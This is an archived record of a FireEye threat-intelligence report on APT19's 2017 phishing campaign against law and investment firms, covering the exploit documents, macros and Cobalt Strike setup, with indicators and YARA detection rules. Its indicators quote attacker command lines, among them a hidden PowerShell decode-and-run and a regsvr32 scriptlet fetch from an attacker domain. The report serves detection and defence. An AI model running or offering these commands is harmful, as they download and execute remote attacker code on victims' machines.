{
    "id": "2e9ca144-5c61-4559-8a49-903d11170e4f",
    "created_at": "2022-10-25T16:48:16.930477Z",
    "updated_at": "2025-03-27T02:13:31.289985Z",
    "deleted_at": null,
    "sha1_hash": "6bc4c4b9d535e6579029edd185a930156ef4d353",
    "title": "Privileges and Credentials: Phished at the Request of Counsel",
    "authors": "FireEye",
    "file_creation_date": "2017-06-28T03:51:41Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1402643,
    "plain_text": "# g q Counsel\n\n**[fireeye.com /blog/threat-research/2017/06/phished-at-the-request-of-counsel.html](https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html)**\n\n## Summary\n\nIn May and June 2017, FireEye observed a phishing campaign targeting at least seven global law and investment\nfirms. We have associated this campaign with APT19, a group that we assess is composed of freelancers, with\nsome degree of sponsorship by the Chinese government.\n\nAPT19 used three different techniques to attempt to compromise targets. In early May, the phishing lures leveraged\n[RTF attachments that exploited the Microsoft Windows vulnerability described in CVE 2017-0199. Toward the end of](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)\nMay, APT19 switched to using macro-enabled Microsoft Excel (XLSM) documents. In the most recent versions,\nAPT19 added an application whitelisting bypass to the XLSM documents. At least one observed phishing lure\ndelivered a Cobalt Strike payload.\n\nAs of the writing of this blog post, FireEye had not observed post-exploitation activity by the threat actors, so we\ncannot assess the goal of the campaign. We have previously observed APT19 steal data from law and investment\nfirms for competitive economic purposes.\n\nThis purpose of this blog post is to inform law firms and investment firms of this phishing campaign and provide\ntechnical indicators that their IT personnel can use for proactive hunting and detection.\n\n## The Emails\n\nAPT19 phishing emails from this campaign originated from sender email accounts from the \"@cloudsend[.]net\"\ndomain and used a variety of subjects and attachment names. Refer to the Indicators of Compromise section for\nmore details.\n\n## The Attachments\n\nAPT19 leveraged Rich Text Format (RTF) and macro-enabled Microsoft Excel (XLSM) files to deliver their initial\nexploits. The following sections describe the two methods in further detail.\n\n## RTF Attachments\n\nThrough the exploitation of the HTA handler vulnerability described in [CVE-2017-1099, the observed RTF](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)\nattachments download hxxp://tk-in-f156.2bunny[.]com/Agreement.doc. Unfortunately, this file was no longer hosted\nat tk-in-f156.2bunny[.]com for further analysis. Figure 1 is a screenshot of a packet capture showing one of the RTF\nfiles reaching out to hxxp://tk-in-f156.2bunny[.]com/Agreement.doc.\n\n\n-----\n\nFigure 1: RTF PCAP\n\n## XLSM Attachments\n\nThe XLSM attachments contained multiple worksheets with content that reflected the attachment name. The\nattachments also contained an image that requested the user to “Enable Content”, which would enable macro\nsupport if it was disabled. Figure 2 provides a screenshot of one of the XLSM files\n(MD5:30f149479c02b741e897cdb9ecd22da7).\n\nFigure 2: Enable macros\n\nOne of the malicious XLSM attachments that we observed contained a macro that:\n\n1. Determined the system architecture to select the correct path for PowerShell\n\n2. Launched a ZLIB compressed and Base64 encoded command with PowerShell. This is a typical technique\n\nused by Meterpreter stagers.\n\nFigure 3 depicts the macro embedded within the XLSM file (MD5: 38125a991efc6ab02f7134db0ebe21b6).\n\n\n-----\n\n-----\n\nFigure 3: XLSX Macro\n\nFigure 4 contains the decoded output of the encoded text.\n\nFigure 4: Decoded ZLIB + Base64 payload\n\n\n-----\n\nautodiscovery[.]2bunny[.]com. The requests contain minimal HTTP headers since the PowerShell command is\nexecuted with mostly default parameters. Figure 5 depicts an HTTP GET request generated by the payload, with\nminimal HTTP headers.\n\nFigure 5: GET Request with minimal HTTP headers\n\nConverting the shellcode to ASCII and removing the non-printable characters provides a quick way to pull out\nnetwork-based indicators (NBI) from the shellcode. Figure 6 shows the extracted NBIs.\n\nFigure 6: Decoded shellcode\n\nFireEye also identified an alternate macro in some of the XLSM documents, displayed in Figure 7.\n\nFigure 7: Alternate macro\n\n[This macro uses Casey Smith’s “Squiblydoo” Application Whitelisting bypass technique to run the command in](http://subt0x10.blogspot.com/2017/04/bypass-application-whitelisting-script.html)\nFigure 8.\n\n\n-----\n\n1554d6fe12830ae57284b389a1132d65) contained the code shown in Figure 9.\n\nFigure 9: SCT contents\n\nFigure 10 provides the decoded script. Notice the “$DoIt” string, which is usually indicative of a Cobalt Strike\npayload.\n\n\n-----\n\n-----\n\nA quick conversion of the contents of the variable “$var_code” from Base64 to ASCII shows some familiar network\nindicators, shown in Figure 11.\n\nFigure 11: $var_code to ASCII\n\n## Second Stage Payload\n\nOnce the XLSM launches its PowerShell command, it downloads a typical Cobalt Strike BEACON payload,\nconfigured with the following parameters:\n\nProcess Inject Targets:\n\n%windir%\\syswow64\\rundll32.exe\n\n%windir%\\sysnative\\rundll32.exe\n\nc2_user_agents\n\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts;\nIE0006_ver1;EN_GB)\n\nNamed Pipes\n\n\\\\%s\\pipe\\msagent_%x\n\nbeacon_interval\n\n60\n\nC2\n\nautodiscover.2bunny[.]com/submit.php\n\nautodiscover.2bunny[.]com/IE9CompatViewList.xml\n\nsfo02s01-in-f2.cloudsend[.]net/submit.php\n\nsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml\n\nC2 Port\n\nTCP/80\n\n\n-----\n\nFigure 12: Cobalt Strike BEACON C2\n\n## FireEye Product Detections\n\nThe following FireEye products currently detect and block the methods described above. Table 1 lists the current\ndetection and blocking capabilities by product.\n\n**Detection Name** **Product** **Action** **Notes**\n\nSUSPICIOUS POWERSHELL USAGE (METHODOLOGY) HX Detect XSLM Macro launch\n\nGen:Variant.Application.HackTool.CobaltStrike.1 HX Detect XSLM Macro launch\n\nMalware Object HX Detect BEACON written to disk\n\nBackdoor.BEACON NX Block* BEACON Callback\n\nFE_Malformed_RTF EX/ETP/NX Block* RTF\n\nMalware.Binary.rtf EX/ETP/NX Block* RTF\n\nMalware.Binary EX/ETP/NX Block* RTF\n\nMalware.Binary.xlsx EX/ETP/NX Block* XSLM\n\nTable 1: Detection review\n\n_*Appliances must be configured for block mode._\n\n## Recommendations\n\nFireEye recommends organizations perform the following steps to mitigate the risk of this campaign:\n\n[1. Microsoft Office users should apply the patch from Microsoft as soon as possible, if they have not already](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199)\n\ninstalled it.\n\n2. Search historic and future emails that match the included indicators of compromise.\n\n3. Review web proxy logs for connections to the included network based indicators of compromise.\n\n4. Block connections to the included fully qualified domain names.\n\n5. Review endpoints for the included host based indicators of compromise.\n\n## Indicators of Compromise\n\nThe follo ing section pro ides the IOCs for the ariants of the phishing emails and malicio s pa loads that FireE e\n\n\n-----\n\n## Email Senders\n\nPressReader <infodept@cloudsend[.]net>\n\nAngela Suh <angela.suh@cloudsend[.]net>\n\nAshley Safronoff <ashley.safronoff@cloudsend[.]net>\n\nLindsey Hersh <lindsey.hersh@cloudsend[.]net>\n\nSarah Roberto sarah.roberto@cloudsend[.]net\n\nnoreply@cloudsend[.]net\n\n## Email Subject Lines\n\nMacron Denies Authenticity Of Leak, French Prosecutors Open Probe\n\nMacron Document Leaker Releases New Images, Promises More Information\n\nAre Emmanuel Macron's Tax Evasion Documents Real?\n\nTime Allocation\n\nVacancy Report\n\nchina paper table and graph\n\nresults with zeros – some ready not all finished\n\nMacron Leaks contain secret plans for the islamisation of France and Europe\n\n## Attachment Names\n\nMacron_Authenticity.doc.rtf\n\nMacron_Information.doc.rtf\n\nUS and EU Trade with China and China CA.xlsm\n\nTables 4 5 7 Appendix with zeros.xlsm\n\nProject Codes - 05.30.17.xlsm\n\nWeekly Vacancy Status Report 5-30-15.xlsm\n\nMacron_Tax_Evasion.doc.rtf\n\nMacron_secret_plans.doc.rtf\n\n## Network Based Indicators (NBI)\n\nlyncdiscover.2bunny[.]com\n\nautodiscover.2bunny[.]com\n\nlyncdiscover.2bunny[.]com:443/Autodiscover/AutodiscoverService/\n\n\n-----\n\nsfo02s01-in-f2.cloudsend[.]net/submit.php\n\nsfo02s01-in-f2.cloudsend[.]net/IE9CompatViewList.xml\n\ntk-in-f156.2bunny[.]com\n\ntk-in-f156.2bunny[.]com/Agreement.doc\n\n104.236.77[.]169\n\n138.68.45[.]9\n\n162.243.143[.]145\n\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n\ntf-in-f167.2bunny[.]com:443 (*Only seen in VT not ITW)\n\n## Host Based Indicators (HBI)\n\nRTF MD5 hash values\n\n0bef39d0e10b1edfe77617f494d733a8\n\n0e6da59f10e1c4685bb5b35a30fc8fb6\n\ncebd0e9e05749665d893e78c452607e2\n\nXLSX MD5 hash values\n\n38125a991efc6ab02f7134db0ebe21b6\n\n3a1dca21bfe72368f2dd46eb4d9b48c4\n\n30f149479c02b741e897cdb9ecd22da7\n\nBEACON and Meterpreter payload MD5 hash values\n\nbae0b39197a1ac9e24bdf9a9483b18ea\n\n1151619d06a461456b310096db6bc548\n\nProcess arguments, named pipes, and file paths\n\npowershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object IO.StreamReader\n($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream\n(,$([Convert]::FromBase64String(\"<base64 blob>\")\n\nregsvr32.exe /s /n /u /i:hxxps://lyncdiscover.2bunny.com/Autodiscover scrobj.dll\n\n\\\\<ip>\\pipe\\msagent_<4 digits>\n\nC:\\Documents and Settings\\<user>\\Local Settings\\Temp\\K5om.dll (4 character DLL based on URI of original\nGET request)\n\n## Yara Rules\n\n\n-----\n\nmeta:version=\".1\"\nfiletype=\"MACRO\"\nauthor=\"Ian.Ahl@fireeye.com @TekDefense\"\ndate=\"2017-06-02\"\ndescription=\"This rule is designed to identify macros with the specific encoding used in the sample\n30f149479c02b741e897cdb9ecd22da7.\"\nstrings:\n// OBSFUCATION\n$ob1 = \"ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) &\nChrW(50) & ChrW(46) & ChrW(101)\" ascii wide\n$ob2 = \"ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) &\nChrW(110) & ChrW(32) & ChrW(47)\" ascii wide\n$ob3 = \"ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) &\nChrW(116) & ChrW(112) & ChrW(115)\" ascii wide\n$ob4 = \"ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) &\nChrW(100) & ChrW(105) & ChrW(115)\" ascii wide\n$ob5 = \"ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) &\nChrW(98) & ChrW(117) & ChrW(110)\" ascii wide\n$ob6 = \"ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) &\nChrW(65) & ChrW(117) & ChrW(116)\" ascii wide\n$ob7 = \"ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) &\nChrW(101) & ChrW(114) & ChrW(32)\" ascii wide\n$ob8 = \"ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) &\nChrW(100) & ChrW(108) & ChrW(108)\" ascii wide\n$obreg1 = /(\\w{5}\\s&\\s){7}\\w{5}/\n$obreg2 = /(Chrw\\(\\d{1,3}\\)\\s&\\s){7}/\n// wscript\n$wsobj1 = \"Set Obj = CreateObject(\\\"WScript.Shell\\\")\" ascii wide\n$wsobj2 = \"Obj.Run \" ascii wide\n\ncondition:\n(\n(\n(uint16(0) != 0x5A4D)\n)\nand\n(\nall of ($wsobj*) and 3 of ($ob*)\nor\nall of ($wsobj*) and all of ($obreg*)\n)\n)\n}\n\n\n-----\n\nmeta:version=\".1\"\nfiletype=\"MACRO\"\nauthor=\"Ian.Ahl@fireeye.com @TekDefense\"\ndate=\"2017-06-02\"\ndescription=\"This rule was written to hit on specific variables and powershell command fragments as seen in\nthe macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4.\"\nstrings:\n// Setting the environment\n$env1 = \"Arch = Environ(\\\"PROCESSOR_ARCHITECTURE\\\")\" ascii wide\n$env2 = \"windir = Environ(\\\"windir\\\")\" ascii wide\n$env3 = \"windir + \\\"\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe\\\"\" ascii wide\n// powershell command fragments\n$ps1 = \"-NoP\" ascii wide\n$ps2 = \"-NonI\" ascii wide\n$ps3 = \"-W Hidden\" ascii wide\n$ps4 = \"-Command\" ascii wide\n$ps5 = \"New-Object IO.StreamReader\" ascii wide\n$ps6 = \"IO.Compression.DeflateStream\" ascii wide\n$ps7 = \"IO.MemoryStream\" ascii wide\n$ps8 = \",$([Convert]::FromBase64String\" ascii wide\n$ps9 = \"ReadToEnd();\" ascii wide\n$psregex1 = /\\W\\w+\\s+\\s\\\".+\\\"/\ncondition:\n(\n(\n(uint16(0) != 0x5A4D)\n)\nand\n(\nall of ($env*) and 6 of ($ps*)\nor\nall of ($env*) and 4 of ($ps*) and all of ($psregex*)\n)\n)\n}\n\n\n-----\n\nmeta:\nversion=\".1\"\nfiletype=\"MACRO\"\nauthor=\"joshua.kim@FireEye.com\"\ndate=\"2017-06-02\"\ndescription=\"Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain\n2bunnyDOTcom\"\n\nstrings:\n$header = \"{\\\\rt\"\n\n$lnkinfo = \"4c0069006e006b0049006e0066006f\"\n\n$encoded1 = \"4f4c45324c696e6b\"\n$encoded2 = \"52006f006f007400200045006e007400720079\"\n$encoded3 = \"4f0062006a0049006e0066006f\"\n$encoded4 = \"4f006c0065\"\n\n$http1 = \"68{\"\n$http2 = \"74{\"\n$http3 = \"07{\"\n\n// 2bunny.com\n$domain1 = \"32{\\\\\"\n$domain2 = \"62{\\\\\"\n$domain3 = \"75{\\\\\"\n$domain4 = \"6e{\\\\\"\n$domain5 = \"79{\\\\\"\n$domain6 = \"2e{\\\\\"\n$domain7 = \"63{\\\\\"\n$domain8 = \"6f{\\\\\"\n$domain9 = \"6d{\\\\\"\n\n$datastore = \"\\\\*\\\\datastore\"\n\ncondition:\n$header at 0 and all of them\n}\n\n## Acknowledgements\n\nJoshua Kim, Nick Carr, Gerry Stellatos, Charles Carmakal, TJ Dahms, Nick Richard, Barry Vengerik, Justin Prosco,\nChristopher Glyer\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/sj821a63jgyif6xv2yz4gnut8kxgg7lo"
    ],
    "report_names": [
        "FireEye_Privileges-Credentials-Phished-Request-of-Counsel(06-06-2017)"
    ],
    "threat_actors": [
        {
            "id": "1f3cf3d1-4764-4158-a216-dd6352e671bb",
            "created_at": "2022-10-25T15:50:23.837615Z",
            "updated_at": "2025-03-27T02:00:55.556414Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "APT19",
                "Codoso",
                "C0d0so0",
                "Codoso Team",
                "Sunshop Group"
            ],
            "source_name": "MITRE:APT19",
            "tools": [
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041611,
    "ts_creation_date": 1498621901,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/6bc4c4b9d535e6579029edd185a930156ef4d353.pdf",
        "text": "https://archive.orkl.eu/6bc4c4b9d535e6579029edd185a930156ef4d353.txt",
        "img": "https://archive.orkl.eu/6bc4c4b9d535e6579029edd185a930156ef4d353.jpg"
    }
}